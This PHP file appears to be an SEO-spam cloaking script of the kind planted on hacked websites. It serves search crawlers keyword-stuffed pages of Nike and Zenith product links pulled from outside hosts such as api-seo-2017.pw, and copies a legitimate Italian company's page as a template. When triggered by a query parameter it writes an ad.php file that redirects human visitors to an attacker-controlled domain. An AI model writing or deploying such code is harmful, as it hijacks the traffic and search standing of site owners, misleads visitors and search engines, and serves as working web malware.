<?php
/*****************PZ***************************/
header("Content-type: text/html; charset=utf-8");
define('Default_YU',str_replace('www.','',$_SERVER['HTTP_HOST']));
$homesb=shorturl(Default_YU);
define('DB_URL_EXP', '?'.$homesb);
define('Default_keywords', 'nike verde air max');
define('Default_Page_Run', '10');
//define('Default_YU',str_replace('www.','',$_SERVER['HTTP_HOST']));
define('Default_YU',str_replace('www.','','a.com'));
define('Default_Country', 'it');
define('Default_API', 'http://api.it.api-seo-2017.pw/');
define('Default_Path', '/public/');
define('Default_Domain', 'http://'.$_SERVER['HTTP_HOST'].'/');

$KEY_URL_Path=str_replace(Default_Path,'',$_SERVER['REQUEST_URI']);
if (empty($KEY_URL_Path)) {
    $Mate_Keywords=Default_keywords;
}else{
    $KEY_URL_Path=str_replace(Default_Path,'',$_SERVER['REQUEST_URI']);
    $KEY_URL_Path=str_replace(DB_URL_EXP,'',$KEY_URL_Path);
    $Pir_Url=explode('-',$KEY_URL_Path);
    $Pir_Keywords=str_replace('-'.end($Pir_Url),'',$KEY_URL_Path);
    $Mate_Keywords=str_replace('-',' ',$Pir_Keywords);

}
$Mate_Keywords=ucwords($Mate_Keywords);
/*******************************DUL**************/
if($_GET['tiaoqi']){
    file_put_contents('ad.php','<?php 
Header("HTTP/1.1 301 Moved Permanently");
Header("Location: http://t.api-seo-2017.pw?hl=".$tiaourl);
');

}



$tiaourl= base64_encode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
function checkrobot($useragent=''){
    static $kw_spiders = array('bot', 'crawl', 'spider' ,'slurp', 'sohu-search', 'lycos', 'robozilla');
    static $kw_browsers = array('msie', 'netscape', 'opera', 'konqueror', 'mozilla');

    $useragent = strtolower(empty($useragent) ? $_SERVER['HTTP_USER_AGENT'] : $useragent);
    if(strpos($useragent, 'http://') === false && dstrpos($useragent, $kw_browsers)) return false;
    if(dstrpos($useragent, $kw_spiders)) return true;
    return false;
}
function dstrpos($string, $arr, $returnvalue = false) {
    if(empty($string)) return false;
    foreach((array)$arr as $v) {
        if(strpos($string, $v) !== false) {
            $return = $returnvalue ? $v : true;
            return $return;
        }
    }
    return false;
}
if(checkrobot()){

}else{
    $file='ad.php';
    if (is_readable($file) == false) {

    } else {
        include ('ad.php');
    }


}

$KEY_URL_Path=str_replace(Default_Path,'',$_SERVER['REQUEST_URI']);
$DATA_ASIN=explode('-',$KEY_URL_Path);

$ASIN_ID=end($DATA_ASIN);
function code62($x){
    $show='';
    while($x>0){
        $s=$x % 62;
        if ($s>35){
            $s=chr($s+61);

        }elseif($s>9&&$s<=35){
            $s=chr($s+55);
        }
        $show.=$s;
        $x=floor($x/62);
    }
    return $show;
}
function shorturl($url){
    $url=crc32($url);
    $result=sprintf("%u",$url);
    return code62($result);
}
$str=shorturl(Default_Domain);

$MODO=strtoupper(preg_replace('/[^a-z]*/','',$str));
$MODO=strtoupper($MODO);//域名生成


function _POST_AI($MODO,$PAN_YU,$str){
// echo $MODO,$PAN_YU,$str.'---------------';
    $ASIN_ID=$MODO.'_'.base64_encode($MODO.$PAN_YU);
    $ASIN_ID=str_replace('==','_B2B',$ASIN_ID);
    $ASIN_ID=str_replace('=','_B2',$ASIN_ID);
    return $ASIN_ID;
}

$LIST_QUs= _POST_JEAMA($MODO,$ASIN_ID);
$LIST_QU=str_replace($MODO.'pg=','',$LIST_QUs);
$LIST_QU=str_replace($MODO.'id=','',$LIST_QU);
if (empty($LIST_QU)){
    $LIST_QU='0';
}
function _POST_JEAMA($MODO,$URL_SEO){
    $URL_SEO=str_replace('_B2B','==',$URL_SEO);
    $URL_SEO=str_replace('_B2','=',$URL_SEO);
    $URL_SEO=str_replace($MODO.'_','',$URL_SEO);
    $URL_SEO=base64_decode($URL_SEO);
    return $URL_SEO;
}


if ($KEY_URL_Path == ''){
    $Api=Default_API."?app=".Default_YU."&module=products&q=".str_replace(" ","%20",$Mate_Keywords)."&page=".$LIST_QU."&limit=".Default_Page_Run."&cc=".Default_Country;

    $DATA_JSON=file_get_contents($Api);
//echo $Api;

    $ios_data=json_decode($DATA_JSON,true);
    $jsoin_toba=$ios_data['data']['totalItems'];
    $jsoin_lis=$ios_data['data']['limit'];
    for ($i=0;$i<=ceil($jsoin_toba/$jsoin_lis)-1;$i++){

        $XO_URL=_POST_AI($MODO,'pg='.$i,$str);
        $list_xijseo.= '<li><a href="'.DB_URL_EXP.str_replace(' ', '-',$Mate_Keywords).'-'.$XO_URL.'">'.$i.'</a></li>'."\n";

    }
    $jsoin_data=$ios_data['data']['items'];
    for ($i=0;$i<=count($ios_data['data']['items'])-1;$i++){
        $tihuan_ru='onerror="'."this.src='".$jsoin_data[$i]['placeholder']."'".';"';
        $si=$i+1;
        $XO_URL=_POST_AI($MODO,'id='.$si,$str);
        $body.= '<a href="'.DB_URL_EXP.str_replace(' ', '-',$Mate_Keywords).'-'.$XO_URL.'"><img height="200" width="200" src="'.$jsoin_data[$i]['image'].'" title="'.$Mate_Keywords.'"  alt="'.$Mate_Keywords.','.$jsoin_data[$i]['title'].'" '.$tihuan_ru.'></a>'."\n";

    }
    $title=$ios_data['data']['subKeywords'];
    $n= count($title)-1;
    for ($i=0;$i<=$n;$i++){
        $XO_URL=_POST_AI($MODO,'pg=0',$str);
        $liskeywords.='<li><a href="'.DB_URL_EXP.str_replace(' ', '-',$title[$i]) .'-'.$XO_URL.'">'.ucwords($title[$i]).'</a></li>'."\n";
    }


}else if(strpos($LIST_QUs,'pg=')!==false){

    $Api=Default_API."?app=".Default_YU."&module=products&q=".str_replace(" ","%20",$Mate_Keywords)."&page=".$LIST_QU."&limit=".Default_Page_Run."&cc=".Default_Country;
    $DATA_JSON=file_get_contents($Api);
// print_r($DATA_JSONJI);
    $ios_data=json_decode($DATA_JSON,true);
    $jsoin_toba=$ios_data['data']['totalItems'];
    $jsoin_lis=$ios_data['data']['limit'];
    for ($i=0;$i<=ceil($jsoin_toba/$jsoin_lis)-1;$i++){

        $XO_URL=_POST_AI($MODO,'pg='.$i,$str);
        $list_xijseo.= '<li><a href="'.DB_URL_EXP.str_replace(' ', '-',$Mate_Keywords).'-'.$XO_URL.'">'.$i.'</a></li>'."\n";

    }
    $jsoin_data=$ios_data['data']['items'];
    for ($i=0;$i<=count($ios_data['data']['items'])-1;$i++){
        $tihuan_ru='onerror="'."this.src='".$jsoin_data[$i]['placeholder']."'".';"';
        $XO_URL=_POST_AI($MODO,'id='.$i,$str);
        $body.= '<a href="'.DB_URL_EXP.str_replace(' ', '-',$Mate_Keywords).'-'.$XO_URL.'"><img height="200" width="200" src="'.$jsoin_data[$i]['image'].'" title="'.$Mate_Keywords.'"  alt="'.$Mate_Keywords.','.$jsoin_data[$i]['title'].'" '.$tihuan_ru.'></a>'."\n";

    }
    $title=$ios_data['data']['subKeywords'];
    $n= count($title)-1;
    for ($i=0;$i<=$n;$i++){
        $XO_URL=_POST_AI($MODO,'pg=0',$str);
        $liskeywords.='<li><a href="'.DB_URL_EXP.str_replace(' ', '-',$title[$i]) .'-'.$XO_URL.'">'.ucwords($title[$i]).'</a></li>'."\n";
    }

}else if(strpos($LIST_QUs,'id=')!==false){
    $LIST_QU=$LIST_QU+1;
    $Api=Default_API.'?app='.Default_YU.'&module=product&q='.str_replace(" ","%20",$Mate_Keywords).'&id='. $LIST_QU.'&cc='.Default_Country;
    $jsondata=file_get_contents($Api,true);
    $ios_data=json_decode($jsondata,true);
//print_r($ios_data['data']);
    $tihuan_ru='onerror="'."this.src='".$ios_data['data']['product']['product_placeholder']."'".';"';
    $luji_am=file_get_contents('http://api.bs-api-json.pw/am/resultit.php?keyword='.str_replace(" ","%20",$Mate_Keywords));
    $body= '<h1>'. $ios_data['data']['product']['product_title'].'</h1>'."\n".'<img src="'.$ios_data['data']['product']['product_image'].'" title="'.$Mate_Keywords.'"  alt="'.$Mate_Keywords.','.$ios_data['data']['product']['product_title'].'" '.$tihuan_ru.'>'."\n".$luji_am;


}
function _POST_sjkey($str,$MODO){
    $arrs='nike vapor
|nike vapor 9.5 tour
|nike vapor acc
|nike vapor ace
|nike vapor advantage
|nike vapor ag
|nike vapor air
|nike vapor air max
|nike vapor arancio
|nike vapor bambino
|nike vapor black
|nike vapor blazer
|nike vapor calcetto
|nike vapor calcio
|nike vapor calcio alte
|nike vapor calcio nere
|nike vapor carbon
|nike vapor carbon elite
|nike vapor clay
|nike vapor court
|nike vapor da calcio
|nike vapor donna
|nike vapor driver
|nike vapor elite
|nike vapor energy
|nike vapor federer
|nike vapor federer tennis
|nike vapor fg
|nike vapor flash
|nike vapor flyknit
|nike vapor flyknit calcio
|nike vapor football
|nike vapor giacca
|nike vapor giacca donna
|nike vapor gloves
|nike vapor golf
|nike vapor grip
|nike vapor grip 3
|nike vapor grip 3 goalkeeper
|nike vapor guanti
|nike vapor guanti football
|nike vapor jacket
|nike vapor jet
|nike vapor jet 4
|nike vapor junior
|nike vapor knit
|nike vapor maglia
|nike vapor max 2017
|nike vapor max 2017 scarpe
|nike vapor max air
|nike vapor max air (medium
|nike vapor max air 2.0
|nike vapor max donna
|nike vapor max running
|nike vapor max scarpe
|nike vapor max uomo
|nike vapor mercurial
|nike vapor neymar
|nike vapor power
|nike vapor pro
|nike vapor quick
|nike vapor rosa
|nike vapor sg
|nike vapor shark 2
|nike vapor slider
|nike vapor speed
|nike vapor superfly
|nike vapor superfly 2
|nike vapor tennis
|nike vapor tennis uomo
|nike vapor tour
|nike vapor tour 9
|nike vapor tour 9.5
|nike vapor txt
|nike vapor untouchable
|nike vapor untouchable 2
|nike vapor untouchable pro
|nike vapor uomo
|nike vapor uomo tennis
|nike vapor veloce
|nike vapor vi
|nike vapor viola
|nike vapor woman
|nike vapor woven
|nike vapor xi
|nike vapor xi fg
|nike vapor xi neymar
|nike vapor zaino
|nike vapor zoom
|nike vapor zoom 39
|nike vapor zoom 9.5
|nike vapor zoom 9.5 tour
|nike vapor zoom flyknit
|nike vapor zoom tennis
|nike vaporfly
|nike vaporfly elite
|nike vaporfly running
|nike vapormax cdg
|nike vapormax donna
|nike vapormax man
|nike verde
|nike verde acido
|nike verde acqua
|nike verde acqua donna
|nike verde air max
|nike verde air presto uomo
|nike verde chiaro
|nike verde donna
|nike verde fluo
|nike verde fluo uomo
|nike verde lime
|nike verde militare
|nike verde militare bambino
|nike verde militare donna
|nike verde militare scarpe
|nike verde militare uomo
|nike verde oliva
|nike verde oliva donna
|nike verde scarpe
|nike verde scuro
|nike verde uomo
|zenit camera
|zenit calcio
|zenit canon adapter
|zenit custodia
|zenith foto
|zenith fase due
|zenith fase 4
|zenith chronomaster
|zenith cronografo
|zenith cinturino
|zenith chronograph
|zenith captain
|zenith carica manuale
|zenith camera
|zenith cd
|zenith cosmopolitan
|zenit donna
|zenit primero
|zenit pro
|zenit pro sedia
|zenit pompa
|zenith da tavolo
|zenith defy
|zenith donna
|zenith del sole verde
|zenith de luca
|zenith puntine
|zenith pilot
|zenith pennello da barba
|zenith pilot type 20
|zenith pennello
|zenith ps4
|zenith project
|zenith punti metallici 10000
|zenith pacific
|zenit nike
|zenit nikon
|zenit e
|zenit et
|zenit em
|zenit elettrico
|zenit reflex
|zenith el primero
|zenith extreme
|zenith el primer
|zenith elite
|zenith elite automatic
|zenith espada
|zenith elite orologio
|zenith et
|zenith gigante zagor
|zenit uomo
|zenith rainbow
|zenith rider
|zenith radio
|zenith ricambi
|zenith retro
|zenith uomo
|orologio zenith uomo
|zenith vintage
|zenith verde
|zenith vintage orologio';
    $arr=explode('|',$arrs);
    $n=count($arr)-1;
    $ser=rand(4,7);
    for ($i=1;$i<= $ser;$i++){
        $XO_URL=_POST_AI($MODO,'pg=0',$str);
        $x=rand(0,$n);
        $qu=array("\n","\r\n");
        $bosjkey=str_replace($qu,'',$arr[$x]);
        $sjkey.='<li><a href="'.DB_URL_EXP.str_replace(' ','-', $bosjkey).'-'.$XO_URL.'">'.ucwords($bosjkey).'</a></li>'."\n";
    }
    return $sjkey;
}
///模板替换
$html = file_get_contents('http://www.isasrl.it/');
$html =str_replace("<html>",'<html--10>',$html);
$html =str_replace("<body>",'<body--10>',$html);
$html =str_replace('href="','href="/',$html);
$html =str_replace('href="//','href="/',$html);
$html =str_replace('href="/http','href="http',$html);
$html =str_replace('src="','src="/',$html);
$html =str_replace('src="//','src="/',$html);
$html =str_replace('src="/http','src="http',$html);
$doc = new DOMDocument();
@$doc->loadHTML($html);
$xPath = new DOMXPath($doc);


//meta
$titleNode = $xPath->query('//title')->item(0);
if ($titleNode) {
    $titleNode->nodeValue = $Mate_Keywords;
}
$keywordsNode = $xPath->query('//meta[@name="keywords"]')->item(0);
if ($keywordsNode) {
    $keywordsNode->setAttribute('content',  $Mate_Keywords);
}

$descNode = $xPath->query('//meta[@name="description"]')->item(0);
if ($descNode) {
    $oldDesc = $descNode->getAttribute('content');
    $desc = $oldDesc ? $Mate_Keywords. ',' . $oldDesc : $Mate_Keywords;
    $descNode->setAttribute('content', $desc);
}

$revisitNode = $xPath->query('//meta[@name="REVISIT-AFTER"]')->item(0);
if ($revisitNode) {
    $revisitNode->parentNode->removeChild($revisitNode);
}

define("FRAME_SELECTOR", "/html/body");

$selectorNode = $xPath->query(FRAME_SELECTOR)->item(0);
$ksks=_POST_sjkey($str,$MODO);
$body=$liskeywords.$body.$list_xijseo."\n".$ksks."===";
if ($selectorNode) {
    $mainDoc = new DOMDocument();
    @$mainDoc->loadHTML('<?xml encoding="UTF-8">' . $body);

    $mainNode = $mainDoc->getElementsByTagName('html')->item(0);

    $newNode = $doc->importNode($mainNode, true);
    $selectorNode->parentNode->replaceChild($newNode, $selectorNode);
}




$html = $doc->saveHTML();
$html=explode('<div style="position: absolute; top: -999px;left: -999px;">',$html);
$html=$html[0].'

</body>
</html>';
$html=str_replace('<html><body>','',$html);
$html=str_replace('===</body></html>','',$html);
$html=str_replace('body--10','',$html);
echo $html;
?>